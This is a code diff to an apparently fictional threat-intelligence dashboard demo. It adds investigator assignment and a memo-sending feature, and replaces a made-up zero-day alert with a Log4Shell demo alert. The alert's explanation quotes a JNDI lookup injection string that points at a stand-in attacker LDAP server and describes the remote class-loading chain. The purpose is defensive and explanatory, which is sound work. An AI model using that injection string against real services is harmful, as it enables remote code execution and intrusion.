@@ -114,7 +114,7 @@
     <div class="flex items-center gap-2">
       <button data-write-action onclick="triggerSimulation()" class="text-xs flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 transition whitespace-nowrap">
         <svg class="w-3.5 h-3.5 text-cyan-400 animate-spin shrink-0" id="simSpinner" style="display:none;" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg>
-        <span id="simBtnText">Simulate 0-Day Feed Drop</span>
+        <span id="simBtnText">Zero Day Demo</span>
       </button>
       <button onclick="openActivateModal()" class="relative text-xs flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white font-semibold shadow-lg shadow-purple-900/30 transition whitespace-nowrap">
         <span>Activate</span>
@@ -996,6 +996,7 @@
                   <div>Running Software: <span class="text-rose-300" id="modalHostSw">HyperMesh Gateway 2.4.1</span></div>
                   <div>EDR Protection: <span class="text-emerald-300" id="modalHostEdr">CrowdStrike Online</span></div>
                   <div class="col-span-2">Owning Team: <span class="text-amber-300" id="modalOwningTeam">—</span></div>
+                  <div class="col-span-2">Assigned Investigator: <span class="text-cyan-300" id="modalAssignedTo">—</span></div>
                 </div>
               </div>
             </div>
@@ -1402,7 +1403,9 @@
       <!-- Recipient -->
       <div class="px-4 py-2.5 border-b border-slate-800 bg-slate-950/50 flex items-center gap-2 flex-wrap">
         <label for="memoRecipientInput" class="text-[11px] font-mono text-slate-400 shrink-0">TO:</label>
-        <input id="memoRecipientInput" type="text" placeholder="e.g. ciso@corp.com, SOC Tier 1 Alerts" class="flex-1 min-w-[200px] px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:border-indigo-500">
+        <select id="memoRecipientInput" class="flex-1 min-w-[200px] px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-sm text-slate-200 focus:outline-none focus:border-indigo-500">
+          <option value="">-- Select recipient --</option>
+        </select>
         <span id="memoRecipientHint" class="text-[11px] text-slate-500 font-mono"></span>
       </div>
 
@@ -1424,7 +1427,8 @@
         <div class="flex items-center gap-2 flex-wrap">
           <button type="button" onclick="downloadMemo()" class="px-3.5 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-sm">Download .txt</button>
           <button type="button" onclick="downloadMemoDocx()" class="px-3.5 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-sm">Download .docx</button>
-          <button type="button" onclick="emailMemo()" id="btnEmailMemo" class="px-4 py-2 rounded-lg text-white font-semibold text-sm transition">Email</button>
+          <button type="button" onclick="emailMemo()" id="btnEmailMemo" class="px-4 py-2 rounded-lg text-white font-semibold text-sm transition">Email (local client)</button>
+          <button type="button" onclick="sendMemoViaAegis()" id="btnSendMemoAegis" class="px-4 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm transition">Send via AegisCTI</button>
           <button type="button" onclick="copyMemoToClipboard()" id="btnCopyMemo" class="px-4 py-2 rounded-lg text-white font-semibold text-sm transition">Copy to Clipboard</button>
         </div>
       </div>
@@ -2592,7 +2596,7 @@
     }
 
     let currentVersionMajor = 2;
-    let currentVersionMinor = 13;
+    let currentVersionMinor = 14;
     const pendingChanges = [];
 
     const AUDIT_LOG_STORAGE_KEY = 'aegisCtiDemoAuditLog_v1';
@@ -3484,6 +3488,7 @@
       document.getElementById('modalExploitDetails').textContent = alert.exploitDetails || 'Exploit mechanics pending further analysis.';
       document.getElementById('modalIfUnremediated').textContent = alert.ifUnremediated || 'Impact assessment pending further analysis.';
       document.getElementById('modalOwningTeam').textContent = alert.owningTeam || 'Unassigned — needs triage owner';
+      document.getElementById('modalAssignedTo').textContent = alert.assignedTo ? `${alert.assignedTo.displayName} (${alert.assignedTo.email})` : 'Unassigned — no investigator yet';
 
       const iocCategories = [
         { label: 'IP Addresses', key: 'ips', color: 'text-rose-300' },
@@ -3675,6 +3680,7 @@
           <div class="flex flex-wrap items-center justify-between gap-2 p-2.5 rounded-lg bg-slate-950/50 border border-slate-800/70 text-[12px] font-mono" onclick="event.stopPropagation()">
             <div class="flex items-center gap-2 flex-wrap">
               <span class="text-slate-500">Notified ${timeAgo(alert.notifiedAt)} to ${alert.owningTeam || 'Unassigned'}</span>
+              ${alert.assignedTo ? `<span class="px-1.5 py-0.5 rounded border border-cyan-800 bg-cyan-950/60 text-cyan-300 font-bold">Investigating: ${alert.assignedTo.displayName}</span>` : ''}
               <span class="px-1.5 py-0.5 rounded border font-bold ${sla.cls}">${sla.label}</span>
             </div>
             <div class="flex items-center gap-1">${remediationButtonsHtml(alert)}</div>
@@ -4940,6 +4946,14 @@ OWNING TEAM:       ${alert.owningTeam || 'Unassigned'}  (action required)`
       return { recipients: '', source: '' };
     }
 
+    function renderMemoRecipientOptions() {
+      const select = document.getElementById('memoRecipientInput');
+      const current = select.value;
+      select.innerHTML = '<option value="">-- Select recipient --</option>' +
+        MOCK_USERS.map(u => `<option value="${u.email}">${u.displayName} (${u.role})</option>`).join('');
+      select.value = current;
+    }
+
     let activeMemoSections = Object.assign({}, MEMO_SECTION_DEFAULTS);
 
     function openThreatMemoModal(alertId) {
@@ -4964,9 +4978,14 @@ OWNING TEAM:       ${alert.owningTeam || 'Unassigned'}  (action required)`
       document.getElementById('memoBody').textContent = buildMemoText(alert, activeMemoRiskRating, activeMemoSections);
       document.getElementById('memoCopyStatus').textContent = 'Not copied yet.';
 
+      renderMemoRecipientOptions();
       const suggestion = suggestMemoRecipientsForAlert(alert);
-      document.getElementById('memoRecipientInput').value = suggestion.recipients;
-      document.getElementById('memoRecipientHint').textContent = suggestion.recipients ? `Suggested ${suggestion.source} — edit as needed` : 'No matching alert rule — enter recipients manually';
+      const select = document.getElementById('memoRecipientInput');
+      const matchedUser = suggestion.recipients && MOCK_USERS.find(u => suggestion.recipients.includes(u.email));
+      select.value = matchedUser ? matchedUser.email : (alert.assignedTo ? alert.assignedTo.email : '');
+      document.getElementById('memoRecipientHint').textContent = matchedUser
+        ? `Suggested ${suggestion.source} — change if needed`
+        : (alert.assignedTo ? `Defaulted to assigned investigator, ${alert.assignedTo.displayName}` : 'Select who this memo goes to');
 
       document.getElementById('threatMemoModal').classList.remove('hidden');
     }
@@ -5355,6 +5374,65 @@ Correlation Team does not perform remediation itself.
       logMemoArchiveEntry(activeMemoAlertId, activeMemoRiskRating, recipients);
     }
 
+    async function blobToBase64(blob) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result.split(',')[1]);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    async function sendMemoViaAegis() {
+      const alert = MOCK_ALERTS.find(a => a.id === activeMemoAlertId);
+      if (!alert) return;
+      const to = document.getElementById('memoRecipientInput').value;
+      const status = document.getElementById('memoCopyStatus');
+      const btn = document.getElementById('btnSendMemoAegis');
+
+      if (!to) {
+        showToast('Pick a recipient from the dropdown first.', 'error');
+        return;
+      }
+      if (typeof window.docx === 'undefined') {
+        showToast('.docx export library failed to load — check your connection and try again.', 'error');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Sending...';
+      try {
+        const gaugeImg = MEMO_RISK_GAUGE_IMAGES[activeMemoRiskRating];
+        const doc = buildMemoDocxDocument(alert, activeMemoRiskRating, activeMemoSections, gaugeImg);
+        const blob = await window.docx.Packer.toBlob(doc);
+        const docxBase64 = await blobToBase64(blob);
+        const subject = `Threat Memo [${RISK_RATING_META[activeMemoRiskRating].label}]: ${alert.cve} — ${alert.title}`;
+
+        const res = await fetch(`${LIVE_API_BASE}/memo/send`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            to, subject, docxBase64,
+            filename: `threat-memo-${alert.cve}.docx`
+          })
+        });
+        const result = await res.json();
+        if (!res.ok) throw new Error(result.error || 'send failed');
+
+        const recipientLabel = (MOCK_USERS.find(u => u.email === to) || {}).displayName || to;
+        status.textContent = `Sent to ${recipientLabel} via AegisCTI.`;
+        showToast(`Threat memo sent to ${recipientLabel}.`, 'success');
+        logChange('Threat Memo Emailed', `${alert.cve} — sent to ${recipientLabel} (${RISK_RATING_META[activeMemoRiskRating].label})`);
+        logMemoArchiveEntry(activeMemoAlertId, activeMemoRiskRating, to);
+      } catch (e) {
+        showToast('Send failed — the live backend may be unreachable (expected on the public demo).', 'error');
+        status.textContent = 'Send failed — backend unreachable.';
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Send via AegisCTI';
+      }
+    }
+
     // ==========================================
     // FILTER CONTROLS & NAVIGATION
     // ==========================================
@@ -5490,6 +5568,10 @@ Correlation Team does not perform remediation itself.
     }
 
     // SIMULATION ENGINE (Interactive 0-day drop)
+    function pickDemoInvestigator() {
+      return MOCK_USERS.find(u => !u.role.includes('Read-Only')) || MOCK_USERS[0] || null;
+    }
+
     function triggerSimulation() {
       const spinner = document.getElementById('simSpinner');
       const btnText = document.getElementById('simBtnText');
@@ -5498,64 +5580,65 @@ Correlation Team does not perform remediation itself.
 
       setTimeout(() => {
         spinner.style.display = 'none';
-        btnText.textContent = 'Simulate 0-Day Feed Drop';
+        btnText.textContent = 'Zero Day Demo';
 
+        const investigator = pickDemoInvestigator();
+        const demoAssetName = 'log4j-ingest-api-prod-03.corp';
+
+        // Log4Shell (CVE-2021-44228) is a real, historical, CISA KEV-listed zero-day — the CVSS,
+        // EPSS, and KEV status below are its real published values. The affected host, threat-actor
+        // attribution, and asset relationships are fictional, built for this demo the same way every
+        // other alert in this platform is.
         const newAlert = {
-          id: 'CORR-2026-099',
+          id: 'CORR-DEMO-LOG4SHELL',
           graphTopology: 'mesh',
-          title: 'ZERO-DAY INGESTION: OpenSSL Remote Memory Corruption',
-          cve: 'CVE-2026-55901',
-          cvss: 9.9,
+          title: 'ZERO-DAY DEMO: Log4Shell — Apache Log4j Remote Code Execution',
+          cve: 'CVE-2021-44228',
+          cvss: 10.0,
           cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
-          epss: 98.7,
+          epss: 97.4,
           inKev: true,
-          actor: 'VelvetChollima (North Korean Nexus)',
-          actorType: 'State-Sponsored Threat Actor',
-          actorDesc: 'Targeting perimeter SSL/TLS concentrators to achieve initial remote code execution and pivot into enterprise Active Directory infrastructure.',
+          actor: 'Opportunistic Mass-Scanning Botnet',
+          actorType: 'Financially Motivated / Automated Threat Actor',
+          actorDesc: 'Automated internet-wide scanning for public endpoints logging attacker-controlled strings, chaining straight to remote code execution for cryptomining and initial-access resale — exactly how Log4Shell was mass-exploited in the real world within hours of disclosure.',
           actorTtp: 'T1190 - Exploit Public-Facing Application',
           riskScore: 100,
           status: 'Active',
           priority: 'P1-CRITICAL',
           internetFacing: true,
-          targetHost: 'vpn-concentrator-us-west.net',
-          hostIp: '192.0.2.77',
-          environment: 'Edge DataCenter (Public Gateway)',
-          software: 'OpenSSL 3.4.0 Engine (VULNERABLE)',
+          targetHost: demoAssetName,
+          hostIp: '198.51.100.147',
+          environment: 'AWS us-east-1 (Public Ingest API)',
+          software: 'Apache Log4j 2.14.1 (Java 11 Microservice)',
+          assignedTo: investigator ? { username: investigator.username, displayName: investigator.displayName, email: investigator.email } : null,
           secondaryNode: {
-            name: 'ad-sync-agent-01',
-            type: 'IDENTITY BRIDGE',
-            sw: 'Samba / Winbind',
-            desc: 'Authentication sync tunnel into domain controller.'
+            name: 'internal-auth-cache-02',
+            type: 'IDENTITY CACHE',
+            sw: 'Redis Session Store',
+            desc: 'Shared session/token cache reachable from the same internal subnet as the ingest API, once an attacker has a shell on it.'
           },
-          asset2: {
-            name: 'cloud-federation-token-cache',
-            type: 'TOKEN CACHE',
-            sw: 'Azure AD Connect Cache',
-            internetFacing: false,
-            desc: 'Caches federation tokens used for single sign-on into Microsoft 365 and Azure — a second, independent route into identity infrastructure that does not require the AD sync tunnel at all.'
-          },
-          crownJewel: 'Corporate Active Directory Domain Controller',
-          crownJewelPath: 'Primary IPsec Tunnel into Corporate Active Directory',
-          crownJewelDesc: 'Domain Controller hosting enterprise Kerberos authentication, NTDS.dit database, and cloud federation tokens.',
-          summary: 'Newly released advisory with weaponized proof-of-concept. Matched our edge VPN concentrator in us-west within 1.2 seconds of feed ingestion.',
+          crownJewel: 'Customer Record Database (PII)',
+          crownJewelPath: 'Can pivot from ingest API through the internal subnet to the customer record store',
+          crownJewelDesc: 'Houses customer PII and account records — the ingest API has a service account with read access for enrichment lookups, which a shell on the host inherits.',
+          summary: 'Log4Shell (CVE-2021-44228): a real, CISA KEV-listed zero-day from December 2021 — one of the most widely exploited vulnerabilities in recent history, mass-scanned and weaponized within hours of public disclosure.',
           mitreTtp: 'T1190 - Exploit Public-Facing Application',
-          killChain: ['Initial Access (T1190)', 'Execution (T1059)', 'Defense Evasion (T1562)', 'Lateral Movement to Active Directory'],
-          owningTeam: 'Network Engineering — Edge / Perimeter Team',
-          whatIsThis: "A remote, pre-authentication memory-corruption bug in OpenSSL's TLS engine — exploitable during the handshake itself, before any credentials are ever checked.",
-          exploitDetails: "The attacker opens a TLS connection to the VPN concentrator and sends a malformed handshake message before authentication even begins. A parsing flaw in OpenSSL causes it to write attacker-controlled data past the end of an internal buffer, corrupting adjacent memory in a way that lets the attacker run their own code on the device — all before the device has checked any credentials.",
-          ifUnremediated: 'VelvetChollima has a working proof-of-concept circulating already. An unpatched concentrator gives them a primary tunnel straight into Active Directory, risking full domain compromise via the NTDS.dit database.',
+          killChain: ['Initial Access (T1190)', 'Execution via JNDI Lookup (T1059)', 'Remote Class Loading (T1105)', 'Lateral Movement to Internal Subnet'],
+          owningTeam: 'Platform Engineering — API / Ingest Team',
+          whatIsThis: "Log4Shell is a remote code execution flaw in Apache Log4j, one of the most widely used Java logging libraries in the world. If an application logs a string an attacker controls — a request header, a username field, anything — and that string contains a special lookup pattern, Log4j will try to resolve it as a live command.",
+          exploitDetails: "The attacker sends a request containing a string like ${jndi:ldap://attacker-server/a} in any field the application logs — a User-Agent header is the classic example. Log4j's lookup feature parses that pattern and reaches out to the attacker's LDAP server, which responds with a pointer to a malicious Java class. Log4j downloads and executes that class, handing the attacker a shell — no authentication, no user interaction, and the only prerequisite is that the string gets logged at all.",
+          ifUnremediated: 'This is exactly how Log4Shell played out in the real world: mass, automated internet-wide scanning found vulnerable hosts within hours, well before most organizations had even finished identifying where Log4j was running in their own environment. An unpatched ingest API gives an attacker a foothold with a path toward the customer record database.',
           iocs: {
-            ips: ['175.45.178.22 (VelvetChollima infrastructure)'],
-            domains: ['chollima-relay-net[.]kp'],
-            hashes: ['f0a7e299...1cd4 (OpenSSL exploit shellcode loader)']
+            ips: ['198.51.100.210 (demo LDAP callback infrastructure)'],
+            domains: ['demo-jndi-callback[.]example'],
+            hashes: ['b4e9a21f...77ac (demo malicious class loader)']
           },
           radar: {
-            exploitability: 99,
-            exposure: 98,
-            lateralMovement: 96,
-            assetCriticality: 98,
-            actorSophistication: 95,
-            detectionGap: 90
+            exploitability: 100,
+            exposure: 95,
+            lateralMovement: 80,
+            assetCriticality: 90,
+            actorSophistication: 40,
+            detectionGap: 75
           },
           notifiedAt: Date.now(),
           remediationStatus: 'open',
@@ -5563,18 +5646,32 @@ Correlation Team does not perform remediation itself.
         };
 
         MOCK_ALERTS.unshift(newAlert);
+
+        if (!MOCK_ASSETS.some(a => a.name === demoAssetName)) {
+          MOCK_ASSETS.unshift({
+            name: demoAssetName,
+            ip: newAlert.hostIp,
+            cloud: newAlert.environment,
+            sw: newAlert.software,
+            exposed: true,
+            cves: [`${newAlert.cve} (P1)`],
+            edr: 'CrowdStrike (Online)'
+          });
+          renderAssets();
+        }
+
         renderAlerts();
         populateGraphIncidentSelector();
-        logChange('New 0-Day Alert Ingested', newAlert.cve);
+        logChange('Zero Day Demo Triggered', `${newAlert.cve} — assigned to ${investigator ? investigator.displayName : 'unassigned'}`);
         updateDocumentTitle();
 
         const alertsContainer = document.getElementById('alertsContainer');
         if (alertsContainer.firstElementChild) flashNewItem(alertsContainer.firstElementChild);
 
-        showToast(`0-day correlated: ${newAlert.cve} — 1 vulnerable host matched (Risk 100/100).`, 'error');
+        showToast(`Zero Day Demo: ${newAlert.cve} correlated — assigned to ${investigator ? investigator.displayName : 'unassigned'}.`, 'error');
         showMockModal(
-          'REAL-TIME CORRELATION ALERT TRIGGERED',
-          'A brand new 0-day threat feed advisory (CVE-2026-55901) was just ingested via our connected TAXII feed. The correlation engine cross-referenced your cloud inventory and identified 1 vulnerable public host: vpn-concentrator-us-west.net (Risk Score: 100/100). Prioritized to top of queue.'
+          'ZERO DAY DEMO TRIGGERED',
+          `Log4Shell (CVE-2021-44228) — a real, historical zero-day — was just simulated against a demo asset (${demoAssetName}). Risk Score 100/100, assigned to ${investigator ? investigator.displayName : 'no investigator configured'} for triage. Open Correlated Triage to walk through it.`
         );
       }, 1200);
     }
